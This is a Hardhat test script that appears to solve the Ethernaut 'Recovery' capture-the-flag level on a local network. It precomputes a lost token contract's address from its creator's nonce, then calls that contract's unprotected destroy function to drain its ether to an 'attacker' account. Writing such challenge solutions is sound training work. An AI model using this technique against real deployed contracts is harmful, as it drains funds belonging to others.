import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Recovery Hack", async () => {
  async function deployRecoveryFixture() {
    const [deployer, attacker] = await ethers.getSigners();
    const RecoveryFactory = await ethers.getContractFactory("RecoveryFactory");
    const factory = await RecoveryFactory.connect(deployer).deploy();
    await factory.deployed();

    const attackerAddress = await attacker.getAddress();
    // We cannot get the return value of the state-changing function off-chain.
    // Simulate on-chain execution of the createInstance() to get the return value (the address of the deployed instance).
    const recoveryAddress = await factory
      .connect(attacker)
      .callStatic.createInstance(attackerAddress, { value: ethers.utils.parseEther("0.001") });

    // Deploy instance of level
    const tx = await factory
      .connect(attacker)
      .createInstance(attackerAddress, { value: ethers.utils.parseEther("0.001") });
    await tx.wait(1);

    // Get deployed instance of GatekeeperTwo contract
    const recovery = await ethers.getContractAt("Recovery", recoveryAddress);

    return { attacker, factory, recovery };
  }

  it("Recover 0.001 ether", async () => {
    const { attacker, factory, recovery } = await loadFixture(deployRecoveryFixture);
    const attackerAddress = await attacker.getAddress();

    const simpleTokenAddress = ethers.utils.getContractAddress({ from: recovery.address, nonce: 1 });

    expect(await ethers.provider.getBalance(simpleTokenAddress)).to.be.greaterThan(
      0,
      "Computed address is not correct. Balance should be greater than 0."
    );

    const simpleToken = await ethers.getContractAt("SimpleToken", simpleTokenAddress);

    const tx = await simpleToken.connect(attacker).destroy(attackerAddress);
    await tx.wait(1);

    const simpleTokenBalanceAfter = await ethers.provider.getBalance(simpleTokenAddress);
    expect(simpleTokenBalanceAfter).be.equal(0, "Failed to drain SimpleToken contract");

    const success = await factory.validateInstance(recovery.address, attackerAddress);
    expect(success).to.be.eq(true, "Failed to submit the instance!!!");
  });
});
